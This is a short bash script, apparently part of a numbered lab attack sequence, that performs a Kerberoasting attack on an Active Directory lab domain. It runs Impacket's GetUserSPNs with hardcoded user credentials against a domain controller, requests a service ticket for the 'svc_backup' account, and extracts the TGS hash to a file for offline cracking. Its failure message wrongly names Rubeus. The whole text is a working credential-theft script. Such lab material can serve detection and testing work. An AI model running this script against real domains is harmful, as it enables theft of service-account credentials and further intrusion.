#!/usr/bin/env bash
set -euo pipefail

DC_IP="${DC_IP:-172.30.0.10}"
DOMAIN="${DOMAIN:-lab.local}"
USER="svc_backup"
OUT="/opt/attacks/output"
mkdir -p "$OUT"

LOG="$OUT/02-kerberoast.log"
echo "[*] Impacket Kerberoast para ${USER}@${DOMAIN}" | tee "$LOG"
impacket-GetUserSPNs "${DOMAIN}/joao.silva:Senha@123" -dc-ip "$DC_IP" \
    -request-user "$USER" -request 2>&1 | tee -a "$LOG" || true

grep -oE '\$krb5tgs\$[^[:space:]]+' "$LOG" > "$OUT/kerberoast.hash" || true
if [ -s "$OUT/kerberoast.hash" ]; then
    echo '[+] Hash TGS capturado:'
    cat "$OUT/kerberoast.hash"
else
    echo '[!] Rubeus não retornou hash TGS'
    exit 1
fi
